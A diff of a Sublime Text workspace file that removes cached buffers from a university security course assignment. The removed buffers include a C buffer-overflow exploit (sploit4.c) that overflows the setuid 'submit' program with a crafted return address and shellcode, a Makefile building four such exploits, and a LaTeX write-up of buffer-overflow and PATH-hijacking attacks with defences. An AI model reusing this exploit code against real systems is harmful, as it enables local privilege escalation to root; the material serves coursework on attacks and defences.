@@ -20,35 +20,10 @@
 	"buffers":
 	[
 		{
-			"contents": "/*\n * dummy exploit program\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/stat.h>\n#include \"shellcode.h\"\n\n\n#define TARGET \"/usr/local/bin/submit\"\n\nint main(void)\n{\n  char *args[4];\n  char *env[1];\n  int bufferSize = 2048;\n  int i = 0;\n\n  FILE *f;\n\n  f = fopen(\"filename.txt\", \"w\");\n\n  while(i <= bufferSize + 4 - 1) {\n    fprintf(f, \"%c\", 'm');\n    i = i + 1;\n  }\n  fprintf(f, \"%c\", 0xb8);\n  fprintf(f, \"%c\", 0xdf);\n  fprintf(f, \"%c\", 0xbf);\n  fprintf(f, \"%c\", 0xff);\n\n\n  fclose(f);\n\n\n  args[0] = \"blah\"; \n  args[1] = \"filename.txt\"; \n  args[2] = shellcode; \n  args[3] = NULL;\n\n  env[0] = NULL; \n\n  if (execve(TARGET, args, env) < 0)\n    fprintf(stderr, \"execve failed.\\n\");\n\n  exit(0);\n}\n",
-			"file": "securtiy-CS458/a1/sploit4.c",
-			"file_size": 741,
-			"file_write_time": 131085161047703751,
+			"file": "security-CS458/lec3/lecure.tex",
 			"settings":
 			{
-				"buffer_size": 741,
-				"line_ending": "Unix"
-			}
-		},
-		{
-			"contents": "CC=gcc\nCFLAGS=-Wall -ggdb\n\n.PHONY: sploit1.c, sploit2.c, sploit3.c, sploit4.c\n\nall: sploit1 sploit2 sploit3 sploit4\n\nsploit1: sploit1.c\n	$(CC) $(CFLAGS) sploit1.c -o sploit1\n\nsploit2: sploit2.c\n	$(CC) $(CFLAGS) sploit2.c -o sploit2\n\nsploit3: sploit3.c\n	$(CC) $(CFLAGS) sploit3.c -o sploit3\n\nsploit4: sploit4.c\n	$(CC) $(CFLAGS) sploit4.c -o sploit4\n\ncopy:\n	scp * ugster:/home/lajaneck/uml/share",
-			"file": "securtiy-CS458/a1/Makefile",
-			"file_size": 393,
-			"file_write_time": 131084391426424758,
-			"settings":
-			{
-				"buffer_size": 393,
-				"line_ending": "Unix"
-			}
-		},
-		{
-			"contents": "\\documentclass{article}\n\\usepackage{parskip}\n\\usepackage{pdfpages}\n\\usepackage{url}\n\\usepackage[margin=.6in]{geometry}\n\\begin{document}\n\\section*{Question 1} % (fold)\n\\label{sec:question_1}\n\n\n\\subsection*{a)} % (fold)\n\\label{sub:a_}\nThis is a violation of confidentiality and privacy. The violation of confidentiality comes from the fact that access to data (your medical information) was given to a party that was not authorized properly. The violation of privacy comes from the fact that information about you was given away to people without your consent. Since drug companies are not authorized to view your personal data and you did not give consent for them to do so this is a violation of confidentiality and privacy.\n% subsection a_ (end)\n\n\\subsection*{b)} % (fold)\n\\label{sub:b_}\nThis is a violation of integrity since the data that you are receiving (the malware) is most definitely not the information that you requested (the website).\n% subsection b_ (end)\n\n\\subsection*{c)} % (fold)\n\\label{sub:c_}\nThis is a violation of confidentiality since the hacker was surely not an authorized party, but they still gained access to your information.\n% subsection c_ (end)\n\n\\subsection*{d)} % (fold)\n\\label{sub:d_}\nThis is a violation of privacy because your information is being moved around and distributed without your consent and you no longer have control over who has access to it. The child can now do whatever they want with your information without your consent.\n% subsection d_ (end)\n\n\\subsection*{e)} % (fold)\n\\label{sub:e_}\nThis is a violation of confidentiality because data (your password) is being provided to parties that should not have access to it.\n% subsection e_ (end)\n\n\\subsection*{f)} % (fold)\n\\label{sub:f_}\nThis is a violation of availability since now you cannot access data when you want to.\n% subsection f_ (end)\n\n% section question_1 (end)\n\n\\section*{Question 2} % (fold)\n\\label{sec:question_2}\n\\paragraph{Threat 1} % (fold)\n\\label{par:threat_1}\nA person at the convention could change the label on one of the pegs to reference a different server with nefarious purposes. This would be classified as a modification threat because someone has modified the asset that you received.\n% paragraph threat_1 (end)\n\n\\paragraph{Threat 2} % (fold)\n\\label{par:threat_2}\nIf a person at the convention were to create a peg of their own and add it to the clothes line so that you might take it thinking that it was a legitimate peg it would be classified as a fabrication threat.\n% paragraph threat_2 (end)\n\n\\paragraph{Thread 3} % (fold)\n\\label{par:thread_3}\nSomeone at the convention could just throw out a bunch of pegs that would otherwise have been assets to other people at the convention, making it a interruption threat.\n% paragraph thread_3 (end)\n\n\\paragraph{Threat 4} % (fold)\n\\label{par:threat_4}\nSomeone at the convention could walk over and copy down the addresses on the currently available pegs allowing them access to the assets that you could be using. This would be a interception threat.\n% paragraph threat_4 (end)\n\n% section question_2 (end)\n\n\\section*{Question 3} % (fold)\n\\label{sec:question_3}\n\n\\subsection*{a)} % (fold)\n\\label{sub:a_}\nA digital lock is a bit of software that prevents the user from duplicating (amongst other actions) content that is protected by copyright. It is usually used as a defence against piracy.\n\nDavidson, Eric. \"Unlocking Bill C-11: What Are Digital Locks, and Why Should You Care?\" The Fulcrum. Fulcrum Publishing Society, 28 Feb. 2012. Web. 23 May 2016. \\newline \\url{http://thefulcrum.ca/news/unlocking-bill-c-11-what-are-digital-locks-and-why-should-you-care}.\n\n% subsection a_ (end)\n\n\\subsection*{b)} % (fold)\n\\label{sub:b_}\nIn this case the FBI wanted Apple to build software that could break their encryption. This software could be used on any phone instead of a one off decryption key that they could invalidate later. Doing this would make breaking their encryption much easier for future hackers.\n\nAlang, Navneet. \"Best-kept Secrets: The Battle to Safeguard Our Privacy.\" The Globe and Mail. 29 Apr. 2016. Web. 23 May 2016.\n\n% subsection b_ (end)\n\n\\subsection*{c)} % (fold)\n\\label{sub:c_}\nThe statement makes sense if you are referring to physical locks and keys. The author is thinking of it as if a database has a lock to which there is a matching key, so any thing that has an identical lock can be unlocked with this same key. This is not at all what \"breaking encryption\" is or really how this works. My best guess is that the author is more thinking of authorization tokens or private keys. It really doesn't make much sense, if I get your \"digital key\" it will probably only give me access to the one thing that that key was for and only the information on that database you had 1access to. Knowing the secret key to one thing will not suddenly give you access to everything. If we liken it back to the authors lock key metaphor its like each database is protected by a lock that gives out some special keys to people with permission and those keys really only work on some parts of that specific database.\n\nAn Introduction to Cryptography. Santa Clara: Network Associates, 1990.\n% subsection c_ (end)\n\n\\subsection*{d)} % (fold)\n\\label{sub:d_}\nWe define privacy as the user have the right to control how their information is handled and where it is going. The magazine article admitting that users unwittingly hand over information acknowledges that it has already violated privacy by our definition since they didn't know they were handing over information and thus not controlling its use. \n% subsection d_ (end)\n\n% section question_3 (end)\n\n\\section*{Sploit 1} % (fold)\n\\label{sec:sploit_1}\nThe vulnerability is a buffer that gets populated without checking that the thing being loaded into the buffer will actually fit in it. This exploit is a buffer overflow attack on the \\texttt{print\\_usage} function. This function loads a large string into a buffer of a set size. This string incorporates a variable that we can control so by setting this value to a very long string we can make the string larger than the buffer it is being loaded into. When this happens the string will continue being loaded into memory, but it will go below the buffer. Due to the structure of that function the buffer we are overflowing is the first variable on the stack so when we write below it we will first overwrite the stack frame pointer and then we can overwrite the return address. By overwriting the return address we can make the \\texttt{print\\_usage} function return to our shellcode (I loaded it into a different parameter passed into the function, but it can be anywhere so long as you know the address for it). Once this shell code executes we have root access.\n\nA way to fix this vulnerability is to check the size of the data being loaded into the buffer. Another solution is to just use a language that checks for array out of bounds exceptions. Most languages will throw an error and halt if you attempt to write passed the end of memory that you have allocated.\n% section sploit_1 (end)\n\n\\section*{Sploit 2} % (fold)\n\\label{sec:sploit_2}\nThis vulnerability is the code executing a executable without checking that it is the correct executable in \\texttt{show\\_confirmation}. Here this is exploited by creating an executable file in the local directory called \\texttt{ls} that creates a shell. When the code runs that command it will run the one in the local path instead of running the global one defined in the PATH environment variable.\n\nA defence against this is to call the command by its full path. Another defence is to not just run commands and instead running c native code for printing the contents of a directory.\n% section sploit_2 (end)\n\n\\section*{Sploit 3} % (fold)\n\\label{sec:sploit_3}\nThis vulnerability comes from letting people control the environment variable for the execution of your program. This exploit works by changing the PATH variable used by the submit program to first point locally before looking in the standard places. Then the user can create a directory called \\texttt{bin} in the local directory and populated it with any commands that do whatever so long as they are called in the program. In this case it overrides the \\texttt{mkdir} function with one that creates a shell.\n\nA defence against this is to not call shell scripts within c code and to instead use c native commands. Another is to check what your environment variables are before proceeding to see if anyone has altered them. You could also scan the executable you are about to run before running it to see if it does something unwanted.\n% section sploit_3 (end)\n\n\\section*{Sploit 4} % (fold)\n\\label{sec:sploit_4}\nThis vulnerability comes from loading a file into a bugger of a set size without checking the size of the file. A simple buffer overflow attack can be found by loading the correct characters into the file with the return address for the shellcode loaded into memory at the end. It works very similarly to sploit 1.\n\nA defence against this is to check the size of the file you are about to load into the buffer or to stop loading characters into the buffer when its full size has been reached.\n% section sploit_4 (end)\n\n\n\n\n\n\\end{document}",
-			"file": "securtiy-CS458/a1/a1.tex",
-			"file_size": 9239,
-			"file_write_time": 131084919752187661,
-			"settings":
-			{
-				"buffer_size": 9239,
+				"buffer_size": 7291,
 				"line_ending": "Unix"
 			}
 		}
@@ -118,19 +93,20 @@
 	},
 	"expanded_folders":
 	[
-		"/home/lara/notes/securtiy-CS458"
+		"/home/lara/notes/security-CS458"
 	],
 	"file_history":
 	[
+		"/home/lara/notes/securtiy-CS458/a1/a1.tex",
+		"/home/lara/notes/securtiy-CS458/a1/Makefile",
+		"/home/lara/notes/securtiy-CS458/a1/sploit4.c",
 		"/home/lara/notes/security.sublime-workspace",
 		"/home/lara/notes/securtiy-CS458/a1/submit.c",
-		"/home/lara/notes/securtiy-CS458/a1/a1.tex",
 		"/home/lara/notes/securtiy-CS458/a1/sploit2.c",
 		"/home/lara/notes/securtiy-CS458/a1/a1.pdf",
 		"/home/lara/notes/securtiy-CS458/a1/sploit1.c",
 		"/home/lara/notes/securtiy-CS458/a1/gdb_commands.txt",
 		"/home/lara/notes/securtiy-CS458/a1/sploit3.c",
-		"/home/lara/notes/securtiy-CS458/a1/Makefile",
 		"/home/lara/notes/securtiy-CS458/a1/sploit1",
 		"/home/lara/Old-Notes/3b/concurrency-CS343/a4/Makefile",
 		"/home/lara/Old-Notes/2b/CS247/Assignment3/Question1/makefile",
@@ -251,24 +227,24 @@
 	"groups":
 	[
 		{
-			"selected": 2,
+			"selected": 0,
 			"sheets":
 			[
 				{
 					"buffer": 0,
-					"file": "securtiy-CS458/a1/sploit4.c",
+					"file": "security-CS458/lec3/lecure.tex",
 					"semi_transient": false,
 					"settings":
 					{
-						"buffer_size": 741,
+						"buffer_size": 7291,
 						"regions":
 						{
 						},
 						"selection":
 						[
 							[
-								685,
-								685
+								3785,
+								3785
 							]
 						],
 						"settings":
@@ -276,6 +252,21 @@
 							"BracketHighlighterBusy": false,
 							"bh_regions":
 							[
+								"bh_regex",
+								"bh_regex_center",
+								"bh_regex_open",
+								"bh_regex_close",
+								"bh_regex_content",
+								"bh_double_quote",
+								"bh_double_quote_center",
+								"bh_double_quote_open",
+								"bh_double_quote_close",
+								"bh_double_quote_content",
+								"bh_square",
+								"bh_square_center",
+								"bh_square_open",
+								"bh_square_close",
+								"bh_square_content",
 								"bh_angle",
 								"bh_angle_center",
 								"bh_angle_open",
@@ -296,222 +287,31 @@
 								"bh_default_open",
 								"bh_default_close",
 								"bh_default_content",
-								"bh_double_quote",
-								"bh_double_quote_center",
-								"bh_double_quote_open",
-								"bh_double_quote_close",
-								"bh_double_quote_content",
 								"bh_tag",
 								"bh_tag_center",
 								"bh_tag_open",
 								"bh_tag_close",
 								"bh_tag_content",
-								"bh_single_quote",
-								"bh_single_quote_center",
-								"bh_single_quote_open",
-								"bh_single_quote_close",
-								"bh_single_quote_content",
 								"bh_round",
 								"bh_round_center",
 								"bh_round_open",
 								"bh_round_close",
 								"bh_round_content",
-								"bh_square",
-								"bh_square_center",
-								"bh_square_open",
-								"bh_square_close",
-								"bh_square_content",
-								"bh_regex",
-								"bh_regex_center",
-								"bh_regex_open",
-								"bh_regex_close",
-								"bh_regex_content",
-								"bh_unmatched",
-								"bh_unmatched_center",
-								"bh_unmatched_open",
-								"bh_unmatched_close",
-								"bh_unmatched_content"
-							],
-							"syntax": "Packages/C++/C.sublime-syntax",
-							"tab_size": 2,
-							"translate_tabs_to_spaces": true
-						},
-						"translation.x": 0.0,
-						"translation.y": 0.0,
-						"zoom_level": 1.0
-					},
-					"stack_index": 2,
-					"type": "text"
-				},
-				{
-					"buffer": 1,
-					"file": "securtiy-CS458/a1/Makefile",
-					"semi_transient": false,
-					"settings":
-					{
-						"buffer_size": 393,
-						"regions":
-						{
-						},
-						"selection":
-						[
-							[
-								0,
-								0
-							]
-						],
-						"settings":
-						{
-							"BracketHighlighterBusy": false,
-							"bh_regions":
-							[
-								"bh_angle",
-								"bh_angle_center",
-								"bh_angle_open",
-								"bh_angle_close",
-								"bh_angle_content",
-								"bh_curly",
-								"bh_curly_center",
-								"bh_curly_open",
-								"bh_curly_close",
-								"bh_curly_content",
-								"bh_c_define",
-								"bh_c_define_center",
-								"bh_c_define_open",
-								"bh_c_define_close",
-								"bh_c_define_content",
-								"bh_default",
-								"bh_default_center",
-								"bh_default_open",
-								"bh_default_close",
-								"bh_default_content",
-								"bh_double_quote",
-								"bh_double_quote_center",
-								"bh_double_quote_open",
-								"bh_double_quote_close",
-								"bh_double_quote_content",
-								"bh_tag",
-								"bh_tag_center",
-								"bh_tag_open",
-								"bh_tag_close",
-								"bh_tag_content",
-								"bh_single_quote",
-								"bh_single_quote_center",
-								"bh_single_quote_open",
-								"bh_single_quote_close",
-								"bh_single_quote_content",
-								"bh_round",
-								"bh_round_center",
-								"bh_round_open",
-								"bh_round_close",
-								"bh_round_content",
-								"bh_square",
-								"bh_square_center",
-								"bh_square_open",
-								"bh_square_close",
-								"bh_square_content",
-								"bh_regex",
-								"bh_regex_center",
-								"bh_regex_open",
-								"bh_regex_close",
-								"bh_regex_content",
-								"bh_unmatched",
-								"bh_unmatched_center",
-								"bh_unmatched_open",
-								"bh_unmatched_close",
-								"bh_unmatched_content"
-							],
-							"syntax": "Packages/Makefile/Makefile.sublime-syntax"
-						},
-						"translation.x": 0.0,
-						"translation.y": 0.0,
-						"zoom_level": 1.0
-					},
-					"stack_index": 1,
-					"type": "text"
-				},
-				{
-					"buffer": 2,
-					"file": "securtiy-CS458/a1/a1.tex",
-					"semi_transient": false,
-					"settings":
-					{
-						"buffer_size": 9239,
-						"regions":
-						{
-						},
-						"selection":
-						[
-							[
-								995,
-								995
-							]
-						],
-						"settings":
-						{
-							"BracketHighlighterBusy": false,
-							"bh_regions":
-							[
-								"bh_curly",
-								"bh_curly_center",
-								"bh_curly_open",
-								"bh_curly_close",
-								"bh_curly_content",
-								"bh_angle",
-								"bh_angle_center",
-								"bh_angle_open",
-								"bh_angle_close",
-								"bh_angle_content",
-								"bh_tag",
-								"bh_tag_center",
-								"bh_tag_open",
-								"bh_tag_close",
-								"bh_tag_content",
-								"bh_default",
-								"bh_default_center",
-								"bh_default_open",
-								"bh_default_close",
-								"bh_default_content",
-								"bh_single_quote",
-								"bh_single_quote_center",
-								"bh_single_quote_open",
-								"bh_single_quote_close",
-								"bh_single_quote_content",
 								"bh_unmatched",
 								"bh_unmatched_center",
 								"bh_unmatched_open",
 								"bh_unmatched_close",
 								"bh_unmatched_content",
-								"bh_c_define",
-								"bh_c_define_center",
-								"bh_c_define_open",
-								"bh_c_define_close",
-								"bh_c_define_content",
-								"bh_double_quote",
-								"bh_double_quote_center",
-								"bh_double_quote_open",
-								"bh_double_quote_close",
-								"bh_double_quote_content",
-								"bh_round",
-								"bh_round_center",
-								"bh_round_open",
-								"bh_round_close",
-								"bh_round_content",
-								"bh_square",
-								"bh_square_center",
-								"bh_square_open",
-								"bh_square_close",
-								"bh_square_content",
-								"bh_regex",
-								"bh_regex_center",
-								"bh_regex_open",
-								"bh_regex_close",
-								"bh_regex_content"
+								"bh_single_quote",
+								"bh_single_quote_center",
+								"bh_single_quote_open",
+								"bh_single_quote_close",
+								"bh_single_quote_content"
 							],
 							"syntax": "Packages/LaTeX/LaTeX.sublime-syntax"
 						},
 						"translation.x": 0.0,
-						"translation.y": 0.0,
+						"translation.y": 821.0,
 						"zoom_level": 1.0
 					},
 					"stack_index": 0,
@@ -572,6 +372,10 @@
 		"last_filter": "",
 		"selected_items":
 		[
+			[
+				"3lec",
+				"lec3/lecure.tex"
+			],
 			[
 				"a1te",
 				"a1/a1.tex"
